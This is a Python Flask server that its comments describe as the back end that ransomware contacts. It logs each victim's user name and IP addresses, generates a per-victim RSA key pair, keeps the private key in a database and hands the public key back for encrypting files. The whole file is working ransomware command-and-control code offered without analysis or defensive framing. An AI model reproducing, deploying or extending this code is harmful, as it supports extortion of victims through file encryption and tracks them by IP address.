#!/usr/bin/python
from flask import Flask, request, render_template
import sqlite3
from Crypto.PublicKey import RSA
from datetime import date
import os

con=None
cur=None

if not os.path.exists('users.db'):
    con = sqlite3.connect('users.db')
    cur = con.cursor()
    cur.execute('''CREATE TABLE users
                    (USER text, PUBLIC_IP text, PRIVATE_IP text, PUBLIC_KEY text, PRIVATE_KEY text, DATE date)''')
# Create table
else:
    con = sqlite3.connect('users.db')
    cur = con.cursor()


app = Flask(__name__)

# first page that ransomware will talk to 
# it will save user's data in DB, create it's own
# public key, private key and save al this keys
# at the DB on current user's row
@app.route("/create", methods=['GET'])
def create_key():
    public_ip = request.args.get("pubip")
    private_ip = request.args.get("privip")
    user = request.args.get("user")
    key = RSA.generate(2048)
    priv = key.export_key()
    with open('private.pem', 'wb') as f:
        f.write(priv)
    pub = key.publickey().export_key()
    with open('public.pem', 'wb') as f:
        f.write(pub)
    with sqlite3.connect('users.db') as con:
        cur = con.cursor()
        today = date.today()
        values = (user, public_ip, private_ip, pub, priv, today,)
        cur.execute(f"INSERT INTO USERS (USER, PUBLIC_IP, PRIVATE_IP, PUBLIC_KEY, PRIVATE_KEY, DATE) VALUES (?, ?, ?, ?, ?, ?)", values)
        con.commit()
    return pub

# it's the getter of public key by private ip, public ip
# and username passed as parameters with request
# to /getkey page
@app.route("/getkey", methods=['GET'])
def find_key():
    public_ip = request.args.get("pubip")
    private_ip = request.args.get("privip")
    user = request.args.get("user")
    print('Creating key for user: /npublic_ip: '+ public_ip + '\nprivate_ip: '+ private_ip+ '\nuser_name: ' + user)
    with sqlite3.connect('users.db') as con:
        cur = con.cursor()
        cur.execute(f"SELECT PUBLIC_KEY FROM USERS WHERE PUBLIC_IP=? AND PRIVATE_IP=? AND USER=?", (public_ip, private_ip, user,))
        rows = cur.fetchone()
        public_key = None
        for value in rows:
            public_key = value
        return public_key

if __name__ == '__main__':
    app.run(port=8080)
